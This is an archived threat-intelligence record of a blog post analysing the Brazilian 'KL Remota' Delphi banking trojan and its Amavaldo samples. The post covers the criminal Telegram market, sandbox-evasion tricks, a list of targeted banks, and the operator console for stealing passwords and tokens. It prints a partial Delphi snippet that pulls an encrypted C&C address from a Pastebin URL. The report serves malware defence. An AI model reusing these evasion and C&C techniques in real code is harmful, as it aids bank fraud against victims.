{
    "id": "4a72a5f6-f8b7-4cfc-a541-ded7ff739aa0",
    "created_at": "2023-04-05T02:09:37.638761Z",
    "updated_at": "2025-03-27T02:06:03.302031Z",
    "deleted_at": null,
    "sha1_hash": "ed188a2f4f9540466ad6915fd8591191a71485dc",
    "title": "2023-03-04 - KL Remota - Brazilian Malware Bank",
    "authors": "",
    "file_creation_date": "2023-04-03T08:26:00Z",
    "file_modification_date": "2023-04-03T08:26:00Z",
    "file_size": 186797,
    "plain_text": "# KL Remota — Brazilian Malware Bank\n\n**[blog.threatzero.io/kl-remota-brazilian-malware-bank-244ac569fb33](https://blog.threatzero.io/kl-remota-brazilian-malware-bank-244ac569fb33)**\n\nRaphael Mendonça March 6, 2023\n\nAmong security researchers, Brazil has become known mainly for its trojans developed in\nthe Delphi language.\n\nThey are different trojan families with similar technical characteristics and objectives: stealing\ndata and sessions, establishing persistence and transferring money from victims’ bank\naccounts through remote access.\n\nOver the last few years, different names have been used to identify this type of malware.\n\nTimeline Brazilian Malware Bank\nA multidisciplinary cybercrime ecosystem offers specific capabilities and moves\nimmeasurable amounts of money.\n\nThe telegram network is considered the Brazilian darkweb and all the necessary services are\navailable in channels specialized in the respective themes.\n\nEcosystem Brazilian Malware Bank\nKL Remota, a term used among threat actors, is the generic name of the Trojan source code\nin Delphi and can be easily found in telegram channels at an approximate cost of $6,000\ndollars, however, after payment there is no guarantee that the seller will actually share the\ncode, which makes it difficult to purchase this type of malware source code.\n\n\n-----\n\nThe weekly rental becomes an alternative with less risk and investment, for the approximate\namount of $600 dollars it is possible to rent an Server C&C operator interface with a limited\nnumber of infects (Ex: 30) and start a small campaign.\n\nKL Components\n\nIn December 2022 we collected samples from Amavaldo and observed the use of captcha as\na new technique added to avoid automated analysis.\n\nAnother well-known technique that has the same objective is the inclusion of multiple Bytes\nat the end of the file so that its size is greater than that supported by platforms such as\nVirusTotal and Any.Run\n\nBinary diff\n[Still about on anti-debug techniques, we observed that the algorithm developed by Tom Lee](http://delphi.icm.edu.pl/ftp/d20free/tomencry.zip)\nis used to decrypt a string collected from the Pastebin platform.\n\nThe string aims to reveal the IP address and Port of the Command-and-Control to which the\nvictim’s device must establish the reverse connection.\n```\nbegin\n try\n CoInitialize(nil);\n URL := 'http://pastebin.com/raw/xxxxxx';\n dados := nil;\n dados := TStringList.Create;\n res1 := nil;\n res1 := TStringList.Create;\n res2 := nil;\n res2 := TStringList.Create;\n rel := nil;\n rel := TStringList.Create;\n\n http := CreateOleObject('WinHttp.WinHttpRequest.5.1');\n http.open('GET', URL, false);\n http.send;\n usuarios := http.responsetext;\n\n dados.Text := usuarios;\n dados.Text := StringReplace(dados.Text, '&quot;', '\"',\n [rfReplaceAll, rfIgnoreCase]);\n res1.Add(dados.Text); res2.Add(ExtractText(res1.Strings[0], 'start', 'end')); \njsonObj := TJSONObject.ParseJSONValue(TEncoding.ASCII.GetBytes (res2.Text), 0) as\nTJSONObject; jv_Host := jsonObj.Get('host').JsonValue; Address :=\ntrim(vDecript(jv Host Value)); } CoUninitialize; exceptend;\n\n```\n\n-----\n\nAfter running Amavaldo, it creates a process in the operating system, loads the DLL\nNvSmartMax.dll into memory and, through the FindWindow function, starts monitoring the\nactive windows in the victim’s session in the background.\n\nIn its code there is a list of strings belonging to the financial institutions that will be triggers to\nestablish the connection with the attacker’s C&C after the user accesses the respective\nwebsites.\n\nThe operator interface also offers server functionality, for each connected victim an audible\nalert is issued, and the console displays hostname, financial institution name, IP address and\nbrowser information.\n\nKL Operator\nWhile the victim browses the bank page, the attacker monitors his activities until the moment\nhe starts the interaction, then the victim will have the perception that protection modules are\nbeing updated on his device, when in fact the attacker will be logged into his account\nbanking from your own computer and making transfers to other current accounts.\n\nAmong the options available on the operator console are:\n\nStandby Mode\nRequest QR code\nRequest 6-digits password.\nRequest account password.\nRequest certificate password.\nRequest SMS token.\nRequest key.\nRequest electronic signature.\nRestart the victim’s computer.\n\nTela de Modo Espera do Banco do Brasil\nThe institutions identified as targets of the Amavaldo malware were:\n\nBank of Brasil\nBradesco Bank\nItáu Bank\nSantander Bank\nSicredi Bank\nMercantil Bank\nCaixa Economica\nSicoob Bank\nUnicred Bank\nBNB Bank\nInter Bank\n\n\n-----\n\nSicoob\nMUFG Bank\nBanestes\nBank of the State of Pará\nCetelem\nSafraNet\nPaulista Bank\nUnicred\nUniprimeCentral\nBMG Bank\nVotorantim Bank\nNBC Bank\nTribanco\nAlfa Bank\nIndusval & Partners Bank\nBanrisul\nOriginal Bank\nCelcoin\nNubank\nBank of Brasília\nBank of Amazônia\nBanese\nTopazio Bank\nIndustrial Bank\nDaycoval\nCidetran\nViacredi\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-04 - KL Remota - Brazilian Malware Bank.pdf"
    ],
    "report_names": [
        "2023-03-04 - KL Remota - Brazilian Malware Bank.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1680660577,
    "ts_updated_at": 1743041163,
    "ts_creation_date": 1680510360,
    "ts_modification_date": 1680510360,
    "files": {
        "pdf": "https://archive.orkl.eu/ed188a2f4f9540466ad6915fd8591191a71485dc.pdf",
        "text": "https://archive.orkl.eu/ed188a2f4f9540466ad6915fd8591191a71485dc.txt",
        "img": "https://archive.orkl.eu/ed188a2f4f9540466ad6915fd8591191a71485dc.jpg"
    }
}